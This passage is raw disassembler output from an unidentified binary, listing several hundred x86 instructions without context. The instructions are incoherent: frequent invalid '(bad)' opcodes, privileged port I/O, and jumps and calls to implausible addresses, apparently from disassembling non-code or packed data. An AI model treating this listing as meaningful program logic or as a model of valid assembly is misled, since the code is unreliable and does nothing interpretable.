  41fd77:	sbb    al,0x6b
  41fd79:	aaa    
  41fd7a:	mov    bl,BYTE PTR [esi-0x6f]
  41fd7d:	mov    al,0xe1
  41fd7f:	sub    eax,0xa6745e44
  41fd84:	and    DWORD PTR [edi+0x33],eax
  41fd87:	push   es
  41fd88:	jle    0x41fd5c
  41fd8a:	adc    ch,dl
  41fd8c:	or     eax,0x7c864f73
  41fd91:	pop    esi
  41fd92:	sub    eax,0x446e354
  41fd97:	mov    esi,0x89ce7f69
  41fd9c:	aas    
  41fd9d:	fnstsw WORD PTR [edi]
  41fd9f:	sub    BYTE PTR ds:0xd2d1e069,ch
  41fda5:	fsubrp st(5),st
  41fda7:	scas   al,BYTE PTR es:[edi]
  41fda8:	adc    eax,0x702d14c
  41fdad:	mov    ch,0x79
  41fdaf:	jge    0x41fe00
  41fdb1:	out    0xdb,al
  41fdb3:	retf   
  41fdb4:	sub    eax,0xe912a506
  41fdb9:	push   edi
  41fdba:	pop    esi
  41fdbb:	(bad)  [esi-0x3f]
  41fdbe:	aad    0xa5
  41fdc0:	sbb    al,0xbe
  41fdc2:	pop    eax
  41fdc3:	pop    esi
  41fdc4:	sar    BYTE PTR [ebx],0xf1
  41fdc7:	pusha  
  41fdc8:	test   al,0xb8
  41fdca:	lods   eax,DWORD PTR ds:[esi]
  41fdcb:	dec    edx
  41fdcc:	lods   al,BYTE PTR ds:[esi]
  41fdcd:	dec    ebx
  41fdce:	lods   eax,DWORD PTR ds:[esi]
  41fdcf:	mov    edx,0x2fb4f869
  41fdd4:	dec    edi
  41fdd5:	push   0xffffffbe
  41fdd7:	pop    edx
  41fdd8:	loope  0x41fdce
  41fdda:	das    
  41fddb:	push   es
  41fddc:	xchg   ebx,eax
  41fddd:	dec    ebp
  41fdde:	jb     0x41fdfc
  41fde0:	fisub  DWORD PTR [ebx+0x66]
  41fde3:	aam    0x37
  41fde5:	mov    ecx,0x53dcacdd
  41fdea:	ds mov bh,dl
  41fded:	mov    ebp,0x91bccd3c
  41fdf2:	push   edx
  41fdf3:	jl     0x41fe72
  41fdf5:	inc    ecx
  41fdf6:	js     0x41fe32
  41fdf8:	mov    ebp,DWORD PTR [esi+0x59ade046]
  41fdfe:	pop    edi
  41fdff:	(bad)  
  41fe00:	ins    DWORD PTR es:[edi],dx
  41fe01:	std    
  41fe02:	addr16 push es
  41fe04:	call   0x18ca3169
  41fe09:	xchg   esi,eax
  41fe0a:	lock clc 
  41fe0c:	xor    BYTE PTR [ecx-0x17e27f4],ch
  41fe12:	ds jecxz 0x41fd9d
  41fe15:	mov    al,0x40
  41fe17:	pop    ebx
  41fe18:	test   eax,0x9044dcff
  41fe1d:	stos   DWORD PTR es:[edi],eax
  41fe1e:	lahf   
  41fe1f:	bound  eax,QWORD PTR [ebx+0x31]
  41fe22:	jle    0x41fdd4
  41fe24:	stos   BYTE PTR es:[edi],al
  41fe25:	cmp    al,0xcd
  41fe27:	fmul   DWORD PTR [edx]
  41fe29:	les    edi,FWORD PTR [esi]
  41fe2b:	mov    bl,0x7b
  41fe2d:	xor    esp,DWORD PTR [ebp+0x15]
  41fe30:	and    DWORD PTR [ebx],edx
  41fe32:	sub    eax,ecx
  41fe34:	push   ecx
  41fe35:	adc    BYTE PTR [edi-0x11],ah
  41fe38:	imul   esi,DWORD PTR ds:0x61532990,0xdf4066e0
  41fe42:	dec    eax
  41fe43:	add    BYTE PTR [esi+0x5e],dl
  41fe46:	pop    eax
  41fe47:	or     ebx,DWORD PTR [ebx-0x46]
  41fe4a:	mov    ebp,0x314e8e5e
  41fe4f:	out    0xd4,eax
  41fe51:	loopne 0x41fe29
  41fe53:	dec    esp
  41fe54:	dec    edi
  41fe55:	mov    dh,0xa9
  41fe57:	push   ebp
  41fe58:	int3   
  41fe59:	loopne 0x41feb8
  41fe5b:	call   0x251093e0
  41fe60:	sbb    ah,BYTE PTR [ecx+0x54]
  41fe63:	les    eax,FWORD PTR [ebp-0x7933e2f5]
  41fe69:	mov    edx,ds
  41fe6b:	sub    al,0x39
  41fe6d:	dec    ecx
  41fe6e:	test   BYTE PTR [edi-0x7f],dl
  41fe71:	mov    BYTE PTR [edx+0x637a2faa],ah
  41fe77:	add    ebp,esi
  41fe79:	cli    
  41fe7a:	jmp    0xd24088e9
  41fe7f:	adc    al,0x0
  41fe81:	sar    BYTE PTR [ebx-0x6d72b6f0],cl
  41fe87:	jge    0x41fe0a
  41fe89:	xor    al,0xf2
  41fe8b:	and    eax,0xd288bca6
  41fe90:	aas    
  41fe91:	inc    esp
  41fe92:	mov    es,WORD PTR [edi]
  41fe94:	pop    esp
  41fe95:	(bad)  
  41fe96:	pop    esp
  41fe97:	inc    ecx
  41fe98:	aam    0xba
  41fe9a:	jecxz  0x41fe47
  41fe9c:	add    eax,0x5fa6f0e4
  41fea1:	sbb    BYTE PTR [esi+0x26],cl
  41fea4:	int3   
  41fea5:	mov    cl,0x5e
  41fea7:	imul   edi,edx,0xfffffff3
  41feaa:	ret    0x3f1a
  41fead:	shr    BYTE PTR [eax-0x1bbd1ed9],cl
  41feb3:	popa   
  41feb4:	ds stc 
  41feb6:	es mov dl,0xf6
  41feb9:	and    al,0xe
  41febb:	mov    ch,0xcc
  41febd:	pop    ss
  41febe:	icebp  
  41febf:	jb     0x41fe8f
  41fec1:	mov    ebp,0xfeeefa61
  41fec6:	lods   eax,DWORD PTR ds:[esi]
  41fec7:	add    al,0xab
  41fec9:	sub    cl,BYTE PTR [edi]
  41fecb:	mov    al,ds:0x8357fa5d
  41fed0:	sbb    DWORD PTR [ebx-0xc],0xffffffe1
  41fed4:	sbb    BYTE PTR [ebp+0x14],ah
  41fed7:	mov    ecx,DWORD PTR [ecx-0x6d]
  41feda:	mov    eax,0x61f694c1
  41fedf:	mov    ds:0x16b43f49,al
  41fee4:	ror    ah,0x50
  41fee7:	int3   
  41fee8:	popa   
  41fee9:	rcr    DWORD PTR [eax+ebx*2+0x1a],0x64
  41feee:	push   edi
  41feef:	pusha  
  41fef0:	out    dx,eax
  41fef1:	sub    bl,cl
  41fef3:	mov    eax,0x955547e2
  41fef8:	xchg   edx,eax
  41fef9:	test   eax,0xd805be3d
  41fefe:	add    al,0x14
  41ff00:	out    dx,eax
  41ff01:	pop    es
  41ff02:	push   esi
  41ff03:	pop    edx
  41ff04:	rcr    BYTE PTR [esi-0x16b809f2],cl
  41ff0a:	sbb    DWORD PTR [esi],ebx
  41ff0c:	mov    dl,0x4b
  41ff0e:	mov    esp,0x18a6ddbe
  41ff13:	xchg   edi,eax
  41ff14:	xchg   ebp,eax
  41ff15:	mov    WORD PTR [ebp+0x1dc1492d],cs
  41ff1b:	call   0x7ca6d98d
  41ff20:	pop    ds
  41ff21:	xchg   edx,eax
  41ff22:	jne    0x41ff7c
  41ff24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff25:	ins    DWORD PTR es:[edi],dx
  41ff26:	lea    edx,[ebx-0x5f4533c7]
  41ff2c:	jp     0x41fefd
  41ff2e:	iret   
  41ff2f:	je     0x41ff00
  41ff31:	(bad)  
  41ff32:	cmp    al,0x46
  41ff34:	push   0xb6a67f1e
  41ff39:	pop    ecx
  41ff3a:	inc    esi
  41ff3b:	cmp    DWORD PTR [edi],edi
  41ff3d:	sub    al,0x6c
  41ff3f:	lock fdiv QWORD PTR [edi]
  41ff42:	idiv   BYTE PTR [ecx]
  41ff44:	sub    al,0x91
  41ff46:	and    BYTE PTR [esp+ecx*4-0x5],ah
  41ff4a:	adc    DWORD PTR [eax],ebp
  41ff4c:	inc    ecx
  41ff4d:	pop    ds
  41ff4e:	adc    al,0x2f
  41ff50:	leave  
  41ff51:	repz rol DWORD PTR [ebp+edx*1+0x71533703],cl
  41ff59:	mov    eax,ds:0xa9b078a6
  41ff5e:	mov    ds:0x1328c30c,al
  41ff63:	pop    eax
  41ff64:	dec    ebp
  41ff65:	cmp    BYTE PTR [ecx+ebp*8],dl
  41ff68:	popa   
  41ff69:	ja     0x41ff0e
  41ff6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff6c:	in     ax,0x94
  41ff6f:	xor    al,0x45
  41ff71:	cwde   
  41ff72:	cli    
  41ff73:	je     0x41fef9
  41ff75:	sub    ebx,0xf
  41ff78:	xchg   edx,eax
  41ff79:	loope  0x41fff2
  41ff7b:	xor    eax,0x9880bbcd
  41ff80:	cdq    
  41ff81:	popa   
  41ff82:	adc    DWORD PTR [esp+ebp*1+0x40],0xf51d2c3d
  41ff8a:	dec    esi
  41ff8b:	dec    ebp
  41ff8c:	ss jmp 0x5a161605
  41ff92:	dec    ecx
  41ff93:	dec    edi
  41ff94:	cmc    
  41ff95:	scas   al,BYTE PTR es:[edi]
  41ff96:	cmp    al,0x1f
  41ff98:	pop    edi
  41ff99:	ficomp WORD PTR [edi+0xe]
  41ff9c:	push   0xffffffda
  41ff9e:	mov    eax,0x1f2b8926
  41ffa3:	sbb    eax,0xbfb48f8f
  41ffa8:	sbb    eax,0x9f1b4374
  41ffae:	or     ebx,DWORD PTR [eax+0x0]
  41ffb1:	(bad)  
  41ffb2:	jno    0x41ff6e
  41ffb4:	jnp    0x41ffa2
  41ffb6:	es mov ah,0x9d
  41ffb9:	push   esi
  41ffba:	push   esi
  41ffbb:	les    edx,FWORD PTR [edi+0x16]
  41ffbe:	inc    esp
  41ffbf:	int3   
  41ffc0:	retf   0xb2b2
  41ffc3:	dec    esi
  41ffc4:	sub    DWORD PTR [eax],edi
  41ffc6:	xor    DWORD PTR [ebx+edi*4],esi
  41ffc9:	cld    
  41ffca:	retf   0xcd98
  41ffcd:	xchg   DWORD PTR [edx-0x6f],eax
  41ffd0:	push   ecx
  41ffd1:	rcr    DWORD PTR [ecx-0x7df0ed7a],1
  41ffd7:	dec    ebp
  41ffd8:	gs pop ds
  41ffda:	retf   0x8f6a
  41ffdd:	jge    0x41ffef
  41ffdf:	popa   
  41ffe0:	or     DWORD PTR [ebx-0x1eda14af],esi
  41ffe6:	mov    ebp,0xce1a15bb
  41ffeb:	mov    ah,0xcc
  41ffed:	das    
  41ffee:	jg     0x420054
  41fff0:	lea    edx,[eax+0x0]
  41fff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fff4:	mov    ebp,0x6bf5e844
  41fff9:	add    edi,DWORD PTR [esi-0x6e8b44a1]
  41ffff:	out    0xb4,al
  420001:	cmp    BYTE PTR [esi],ch
  420003:	mov    bl,0xc8
  420005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420006:	xchg   ebp,eax
  420007:	add    esi,esi
  420009:	dec    edi
  42000a:	imul   esi,DWORD PTR [edi+ebx*8+0xd],0x2af93e41
  420012:	pop    edx
  420013:	imul   ebp,ebx,0xad88c8d5
  420019:	sbb    BYTE PTR [ebp+0x115cecaf],dh
  42001f:	mov    edx,0x8907b90f
  420024:	and    BYTE PTR [edi+0x30],cl
  420027:	xchg   esi,eax
  420028:	xchg   DWORD PTR [eax],ebx
  42002a:	arpl   WORD PTR [ebp+0x58458f79],bx
  420030:	sub    bl,al
  420032:	(bad)  
  420033:	fstp   QWORD PTR [ebx+ecx*1]
  420036:	inc    edx
  420037:	mov    esp,0xb259eb1e
  42003c:	cli    
  42003d:	dec    edi
  42003e:	lods   eax,DWORD PTR ds:[esi]
  42003f:	mov    bh,0x84
  420041:	cmp    BYTE PTR [edx-0x69],dl
  420044:	retf   
  420045:	cmp    DWORD PTR [esi-0x43],edx
  420048:	cld    
  420049:	cwde   
  42004a:	repz push ebx
  42004c:	add    DWORD PTR [esi-0x168dfc46],eax
  420052:	cdq    
  420053:	inc    ecx
  420054:	loope  0x4200b0
  420056:	(bad)  
  420058:	push   ecx
  420059:	push   cs
  42005a:	mov    BYTE PTR es:[esi],0xd4
  42005e:	and    al,0x16
  420060:	ds push ebx
  420062:	jae    0x42006a
  420064:	stos   DWORD PTR es:[edi],eax
  420065:	jg     0x41fff8
  420067:	out    dx,eax
  420068:	cmp    ah,BYTE PTR [esi+0x464c0059]
  42006e:	mov    bh,0x5f
  420070:	dec    esp
  420071:	dec    ebp
  420072:	lds    esp,FWORD PTR [edx*1-0x3a7816b1]
  420079:	jmp    0x71e6:0xc80bae28
  420080:	stos   BYTE PTR es:[edi],al
  420081:	mov    cs,WORD PTR [ecx-0x66]
  420084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420085:	fcmovnbe st,st(4)
  420087:	jo     0x420055
  420089:	xor    ah,al
  42008b:	cmp    BYTE PTR [edx-0x73],ch
  42008e:	call   0x5f3a:0x79fe92f4
  420095:	fucom  st(5)
  420097:	mov    al,ds:0x414cae9e
  42009c:	or     eax,0xb2d0f6b5
  4200a1:	fcomp  DWORD PTR [edx+0x1e56592b]
  4200a7:	xchg   ecx,eax
  4200a8:	daa    
  4200a9:	fst    QWORD PTR [ecx]
  4200ab:	in     al,0xd1
  4200ad:	mov    ebx,DWORD PTR [edx+0x4b8a36ca]
  4200b3:	fldcw  WORD PTR [ecx+edx*8+0x4add07a8]
  4200ba:	dec    ebx
  4200bb:	push   ecx
  4200bc:	sub    al,0xd2
  4200be:	sub    al,0x80
  4200c0:	out    dx,al
  4200c1:	cld    
  4200c2:	xchg   esi,eax
  4200c3:	fwait
  4200c4:	xchg   ebp,eax
  4200c5:	test   DWORD PTR [ecx+ebx*8-0x115f3616],edi
  4200cc:	cmp    DWORD PTR [edx],eax
  4200ce:	mov    eax,ds:0x1b0a60b7
  4200d3:	call   0x8a7d2fce
  4200d8:	imul   eax,ecx,0xffffff96
  4200db:	rol    ebp,0x7
  4200de:	gs das 
  4200e0:	fistp  DWORD PTR [ebx]
  4200e2:	xchg   esp,eax
  4200e3:	xchg   ecx,eax
  4200e4:	sbb    esp,ebx
  4200e6:	xchg   edx,eax
  4200e7:	paddb  mm0,QWORD PTR [edi-0x3d]
  4200eb:	pushf  
  4200ec:	test   BYTE PTR [eax+0x6554862f],cl
  4200f2:	js     0x420158
  4200f4:	mov    al,0xfe
  4200f6:	(bad)
  4200f9:	inc    edx
  4200fa:	add    ebp,DWORD PTR [eax+0x6f7de880]
  420100:	ins    BYTE PTR es:[edi],dx
  420101:	fdiv   QWORD PTR [edx-0x30]
  420104:	nop
  420105:	aaa    
  420106:	es std 
  420108:	lods   eax,DWORD PTR ds:[esi]
  420109:	aam    0x44
  42010b:	push   ebp
  42010c:	xlat   BYTE PTR ds:[ebx]
  42010d:	das    
  42010e:	jle    0x420091
  420110:	(bad)  
  420111:	mov    edx,0x39763653
  420116:	data16 rol BYTE PTR [esi+0xf],cl
  42011a:	and    dh,ch
  42011c:	pop    ebx
  42011d:	aas    
  42011e:	mov    edi,DWORD PTR [esi-0x67a724a8]
  420124:	jmp    0x420106
  420126:	xchg   ax,ax
  420128:	mov    ebx,0xfa716d36
  42012d:	push   cs
  42012e:	enter  0xd4d1,0x2b
  420132:	test   BYTE PTR [esi+0x7a9e37a3],cl
  420138:	out    0x37,al
  42013a:	mov    WORD PTR [edx+ecx*1-0x61],gs
  42013e:	int3   
  42013f:	or     DWORD PTR [ebp+0x742ce5bf],eax
  420145:	inc    edi
  420146:	mov    bl,0xa8
  420148:	dec    edx
  420149:	ret    0x19b8
  42014c:	sub    bl,BYTE PTR [edi]
  42014e:	retf   0x757e
  420151:	pop    esp
  420152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420153:	xchg   al,al
  420155:	sbb    eax,0x4c0ef4a3
  42015a:	pop    ebp
  42015b:	push   edi
  42015c:	test   esi,eax
  42015e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42015f:	(bad)  
  420160:	(bad)  
  420161:	sbb    al,0x21
  420163:	stos   DWORD PTR es:[edi],eax
  420164:	js     0x420190
  420166:	mov    ds:0x2dfc3c5c,al
  42016b:	push   ebp
  42016c:	nop
  42016d:	ret    
  42016e:	fidiv  DWORD PTR [eax+0x53d791a]
  420174:	inc    ebx
  420175:	and    dh,BYTE PTR [eax]
  420177:	data16 or al,0xe3
  42017a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42017b:	cmp    eax,DWORD PTR [esi-0x55c9f64]
  420181:	lahf   
  420182:	sbb    esi,eax
  420184:	cmp    edx,DWORD PTR [eax]
  420186:	mov    esp,esp
  420188:	cdq    
  420189:	xchg   ebp,eax
  42018a:	or     DWORD PTR [ecx+0x4e3a987],edi
  420190:	mul    BYTE PTR [ebp+ebx*1+0x16]
  420194:	sub    bh,BYTE PTR [edi]
  420196:	sti    
  420197:	js     0x4201db
  420199:	mov    ebx,0x12a97b93
  42019e:	enter  0x1b55,0x3e
  4201a2:	xchg   ebp,eax
  4201a3:	retf   0x131b
  4201a6:	push   0x1074e849
  4201ab:	stos   BYTE PTR es:[edi],al
  4201ac:	fadd   QWORD PTR [edi]
  4201ae:	xchg   esp,eax
  4201af:	sub    edi,DWORD PTR [ebp+0x18159878]
  4201b5:	pusha  
  4201b6:	jns    0x420170
  4201b8:	cdq    
  4201b9:	mov    edx,0x22ad4899
  4201be:	sbb    al,0xfb
  4201c0:	jmp    0x420179
  4201c2:	sub    DWORD PTR ds:0x4deef1db,edi
  4201c8:	daa    
  4201c9:	jnp    0x4201a7
  4201cb:	aas    
  4201cc:	mov    ecx,0xefecaab4
  4201d1:	inc    esp
  4201d2:	xchg   esi,eax
  4201d3:	and    BYTE PTR [esi-0x60],bh
  4201d6:	sbb    edi,ecx
  4201d8:	mov    bh,BYTE PTR [edi-0xc]
  4201db:	sbb    DWORD PTR [esi-0x2c],edi
  4201de:	sub    DWORD PTR [ebx],edx
  4201e0:	ja     0x420212
  4201e2:	fwait
  4201e3:	mov    dl,0x75
  4201e5:	sub    BYTE PTR [edx],dl
  4201e7:	sbb    DWORD PTR [ebp+0x715fe6da],ecx
  4201ed:	into   
  4201ee:	fs clc 
  4201f0:	xchg   ecx,eax
  4201f1:	outs   dx,DWORD PTR ds:[esi]
  4201f2:	xchg   edx,eax
  4201f3:	pop    esp
  4201f4:	sbb    ch,BYTE PTR [ebx-0x48f8b4f3]
  4201fa:	dec    esi
  4201fb:	sub    edi,0xffffffb9
  4201fe:	ja     0x42024c
  420200:	pop    es
  420201:	push   ebp
  420202:	sbb    eax,ebx
  420204:	pop    ebx
  420205:	rol    BYTE PTR [ecx+0x35a14b27],cl
  42020b:	adc    edx,DWORD PTR [ecx-0x31]
  42020e:	inc    edi
  42020f:	add    edx,DWORD PTR [esi+ebp*8-0xd1b7aa6]
  420216:	mov    ch,0x8c
  420218:	push   ebx
  420219:	enter  0xf463,0x7a
  42021d:	popf   
  42021e:	jge    0x4201ef
  420220:	leave  
  420221:	mov    ah,0x91
  420223:	dec    ebx
  420224:	in     al,0x1a
  420226:	pop    edi
  420227:	les    ecx,FWORD PTR [ebp+0xb]
  42022a:	add    al,0x24
  42022c:	inc    ebp
  42022d:	mov    ch,0xa2
  42022f:	fild   WORD PTR [ebx-0x73d9e09e]
  420235:	rcr    eax,cl
  420237:	adc    BYTE PTR [ecx],dl
  420239:	fcomp  DWORD PTR [ecx+0x35f66404]
  42023f:	test   eax,0xc3b8f2de
  420244:	repz fwait
  420246:	adc    DWORD PTR [ebp+0x33a3f8a8],ebp
  42024c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42024e:	sbb    eax,0x5a279ebc
  420253:	and    BYTE PTR [ecx+0x1b322a85],0xea
  42025a:	lods   al,BYTE PTR ds:[esi]
  42025b:	add    bh,BYTE PTR [eax]
  42025d:	or     al,0xe
  42025f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420260:	jb     0x4201e3
  420262:	shr    DWORD PTR [edx],cl
  420264:	imul   edi
  420266:	pusha  
  420267:	inc    esi
  420268:	jmp    0x4202d4
  42026a:	or     edx,edx
  42026c:	adc    eax,0xed00744d
  420271:	inc    esp
  420272:	dec    BYTE PTR [eax]
  420274:	xchg   ecx,eax
  420275:	xchg   edi,eax
  420276:	pop    edx
  420277:	mov    ah,0xaf
  420279:	jo     0x42028f
  42027b:	jmp    0x4202c7
  42027d:	pop    eax
  42027e:	test   al,bl
  420280:	push   0xffffff8c
  420282:	(bad)  
  420283:	not    edi
  420285:	push   ebp
  420286:	std    
  420287:	push   ebp
  420288:	cdq    
  420289:	jns    0x42025f
  42028b:	int    0x87
  42028d:	scas   eax,DWORD PTR es:[edi]
  42028e:	test   al,0x4d
  420290:	pushf  
  420291:	dec    esp
  420292:	popa   
  420293:	mov    ch,0xc1
  420295:	leave  
  420296:	ins    DWORD PTR es:[edi],dx
  420297:	add    al,0x8
  420299:	sahf   
  42029a:	and    edi,DWORD PTR [esp+esi*2-0x53]
  42029e:	ds cmp dl,0xc7
  4202a2:	mov    WORD PTR [edx-0x5bec1c33],ss
  4202a8:	xchg   edi,eax
  4202a9:	sbb    cl,BYTE PTR [eax+0x70]
  4202ac:	fxch   st(6)
  4202ae:	test   al,0x2d
  4202b0:	push   cs
  4202b1:	pand   xmm7,XMMWORD PTR [ecx+0x28]
  4202b6:	cmp    esp,esp
  4202b8:	xchg   DWORD PTR [ebx],esi
  4202ba:	and    BYTE PTR [ecx+eax*1-0x71],al
  4202be:	sti    
  4202bf:	or     eax,0x330d4db0
  4202c4:	mov    al,ds:0xeff19f9d
  4202c9:	fisttp QWORD PTR [ebx-0x4d]
  4202cc:	jmp    0x96046fb0
  4202d1:	push   esi
  4202d2:	add    DWORD PTR [ecx+ebp*2-0x1],ebx
  4202d6:	push   eax
  4202d7:	adc    BYTE PTR [ebx-0x76e7560c],bh
  4202dd:	fbld   TBYTE PTR ds:0x1b181121
  4202e3:	pop    ds
  4202e4:	sub    dh,cl
  4202e6:	sub    edi,eax
  4202e8:	push   edx
  4202e9:	fs dec esp
  4202eb:	aad    0xaa
  4202ed:	xchg   DWORD PTR [ecx-0x4f],esp
  4202f0:	inc    ebx
  4202f1:	cs jmp edx
  4202f4:	xor    al,0x7b
  4202f6:	sub    eax,DWORD PTR [ebp-0x49]
  4202f9:	dec    DWORD PTR [edi]
  4202fb:	inc    esp
  4202fc:	mov    bl,0x2e
  4202fe:	imul   edx,DWORD PTR [edi-0x3fac8aca],0x76833363
  420308:	and    DWORD PTR [ebp+eiz*1+0x36],edi
  42030c:	xchg   esi,eax
  42030d:	call   0xb15c:0x16b31ed0
  420314:	retf   
  420315:	mov    ebp,0xa46fa1b6
  42031a:	dec    esp
  42031b:	xor    eax,0x4b2abc37
  420320:	icebp  
  420321:	and    eax,0x951f604c
  420326:	and    ebp,ebp
  420328:	into   
  420329:	inc    esi
  42032a:	mov    dh,0x84
  42032c:	out    dx,eax
  42032d:	arpl   WORD PTR [ebx+0x27],di
  420330:	push   eax
  420331:	stos   DWORD PTR es:[edi],eax
  420332:	leave  
  420333:	push   0xd2d0fdc8
  420338:	sub    eax,0x5f5ae0eb
  42033d:	dec    eax
  42033e:	pop    es
  42033f:	adc    al,0x19
  420341:	test   DWORD PTR [edi-0x2359bdea],ecx
  420347:	stc    
  420348:	xor    DWORD PTR [ebx+0x63fc528e],esp
  42034e:	cmp    dh,BYTE PTR [edi]
  420350:	lea    eax,[edx+0x5621b8fa]
  420356:	test   cl,ch
  420358:	mov    bl,0x2d
  42035a:	(bad)  
  42035b:	leave  
  42035c:	(bad)  
  42035d:	addr16 sub al,0x95
  420361:	rcl    BYTE PTR [edi],0xa2
  420364:	sbb    al,BYTE PTR [ebp-0x22]
  420367:	cdq    
  420368:	sub    al,0x42
  42036a:	fiadd  DWORD PTR [edi+0xad6270]
  420370:	je     0x420318
  420372:	mul    ebx
  420374:	ficomp DWORD PTR [eax-0x2f]
  420377:	and    BYTE PTR [edx],dl
  420379:	fldenv [edi+0x44f3f706]
  42037f:	out    dx,al
  420380:	push   ds
  420381:	ret    
  420382:	inc    edi
  420383:	iret   
  420384:	xor    ecx,DWORD PTR [edi+edi*8-0x1c]
  420388:	ss dec eax
  42038a:	jae    0x42030c
  42038c:	inc    ebp
  42038d:	jns    0x42034d
  42038f:	sbb    eax,0xcda2c9c9
  420394:	mov    BYTE PTR [ebp+0x5a],dl
  420397:	out    0x57,eax
  420399:	mov    DWORD PTR [esi+0x25],edi
  42039c:	xchg   edi,eax
  42039d:	adc    bh,BYTE PTR [eax]
  42039f:	jecxz  0x420377
  4203a1:	gs in  al,0xff
  4203a4:	lock pushf 
  4203a6:	dec    ecx
  4203a7:	aad    0x70
  4203a9:	stos   DWORD PTR es:[edi],eax
  4203aa:	je     0x42033e
  4203ac:	xor    al,0x6c
  4203ae:	xchg   edi,eax
  4203af:	mov    bl,0xe9
  4203b1:	inc    ebp
  4203b2:	dec    ecx
  4203b3:	xchg   ecx,eax
  4203b4:	push   edx
  4203b5:	mov    ch,0x37
  4203b7:	mov    dl,0x3f
  4203b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203ba:	inc    di
  4203bc:	cwde   
  4203bd:	xor    DWORD PTR [eax+0x63dcc87d],edx
  4203c3:	add    edi,DWORD PTR [eax+eax*8]
  4203c6:	clc    
  4203c7:	mov    esi,0xae3e4b62
  4203cc:	(bad)  
  4203cd:	iret   
  4203ce:	pusha  
  4203cf:	repnz or al,0x1c
  4203d2:	es scas eax,DWORD PTR es:[edi]
  4203d4:	bound  ebp,QWORD PTR [ecx+0x6cfb2eb7]
  4203da:	stc    
  4203db:	jle    0x420414
  4203dd:	mov    al,0xa4
  4203df:	adc    eax,edi
  4203e1:	jg     0x420386
  4203e3:	sbb    edi,DWORD PTR [ebx]
  4203e5:	xchg   ecx,eax
  4203e6:	push   ebx
  4203e7:	mov    edx,0x67d7a7e9
  4203ec:	xor    eax,0x943e6efa
  4203f1:	add    ecx,DWORD PTR [edx+eax*2+0x595a9f2f]
  4203f8:	enter  0xb233,0xd3
  4203fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203fd:	add    BYTE PTR [esp+eax*2+0x4a42cba6],ch
  420404:	aam    0xe8
  420406:	dec    esp
  420407:	dec    ecx
  420408:	mov    ebx,0xb36ee8c9
  42040d:	mov    bh,dl
  42040f:	mov    ds:0xa69c8be5,al
  420414:	inc    esp
  420415:	arpl   WORD PTR [edx+esi*4+0x51],dx
  420419:	dec    ecx
  42041a:	sbb    al,0x14
  42041c:	jne    0x4203b4
  42041e:	and    BYTE PTR [ebx],0x76
  420421:	push   es
  420422:	daa    
  420423:	stc    
  420424:	dec    ebp
  420425:	cmp    ch,BYTE PTR [edi-0x1efec7d1]
  42042b:	mov    ebx,0xac87639b
  420430:	dec    esp
  420431:	out    0x25,al
  420433:	jo     0x420457
  420435:	les    ebx,FWORD PTR [ebx]
  420437:	shr    BYTE PTR [esi+edx*4],0xcc
  42043b:	fwait
  42043c:	mov    bl,0x5b
  42043e:	mov    ebp,0x9483268e
  420443:	xchg   DWORD PTR [esi+0x461ab0a0],ecx
  420449:	lock lods eax,DWORD PTR ds:[esi]
  42044b:	aad    0x75
  42044d:	xor    BYTE PTR [esi-0x49],0x71
  420451:	ins    DWORD PTR es:[edi],dx
  420452:	and    DWORD PTR [eax-0x4df6e05b],eax
  420458:	mov    ch,0xb
  42045a:	or     ebx,DWORD PTR [ebx+ecx*1]
  42045d:	pop    ecx
  42045e:	inc    eax
  42045f:	xor    BYTE PTR [ecx+esi*1+0x5b],bl
  420463:	retf   
  420464:	loopne 0x420446
  420466:	mov    edi,0x5c07d0b9
  42046b:	cmp    eax,0x94a31624
  420470:	dec    esi
  420471:	mov    cl,0x3f
  420473:	ret    
  420474:	jo     0x420429
  420476:	xchg   esi,eax
  420477:	aaa    
  420478:	ror    DWORD PTR [ebx],cl
  42047a:	mov    edi,0x978e4b7a
  42047f:	fmul   DWORD PTR [ecx]
  420481:	cld    
  420482:	aam    0xb0
  420484:	jmp    0x4204f6
  420486:	xchg   ebx,eax
  420487:	or     al,0x24
  420489:	mov    esp,0xd79969d5
  42048e:	imul   esp,DWORD PTR [ebx],0x1
  420491:	call   0x34d2afac
  420496:	pop    ss
  420497:	and    DWORD PTR [eax+0x6c],esi
  42049a:	jg     0x420462
  42049c:	or     eax,DWORD PTR ds:0xc8d66385
  4204a2:	adc    edi,esi
  4204a4:	cmp    edx,edx
  4204a6:	adc    al,0x59
  4204a8:	loop   0x420525
  4204aa:	xlat   BYTE PTR ds:[ebx]
  4204ab:	icebp  
  4204ac:	mov    dh,0xfb
  4204ae:	add    al,0x17
  4204b0:	daa    
  4204b1:	jmp    0xff7a:0xd73af3f5
  4204b8:	outs   dx,BYTE PTR ds:[esi]
  4204b9:	bound  ebp,QWORD PTR [edi-0x129e1469]
  4204bf:	add    eax,0xe800e8ca
  4204c4:	cmp    ecx,DWORD PTR [ecx-0x6]
  4204c7:	cld    
  4204c8:	inc    ebp
  4204c9:	mov    esi,0x151836bd
  4204ce:	loope  0x42046c
  4204d0:	out    dx,al
  4204d1:	xchg   DWORD PTR [edi+0x6ad62f51],edx
  4204d7:	mov    cl,bl
  4204d9:	int3   
  4204da:	clc    
  4204db:	mov    BYTE PTR es:[eax],0x7e
  4204df:	daa    
  4204e0:	or     ecx,DWORD PTR [edx+edx*4-0x4ec39acb]
  4204e7:	sub    ebx,DWORD PTR [edi+ecx*2-0x2c]
  4204eb:	shr    DWORD PTR [edi],0xbf
  4204ee:	jnp    0x4204fc
  4204f0:	push   edx
  4204f1:	xor    DWORD PTR [ebx],esp
  4204f3:	int3   
  4204f4:	cwde   
  4204f5:	xchg   ecx,eax
  4204f6:	scas   eax,DWORD PTR es:[edi]
  4204f7:	aaa    
  4204f8:	xchg   edi,eax
  4204f9:	neg    edi
  4204fb:	inc    ebp
  4204fc:	jnp    0x42054e
  4204fe:	lahf   
  4204ff:	jp     0x4204e0
  420501:	ret    
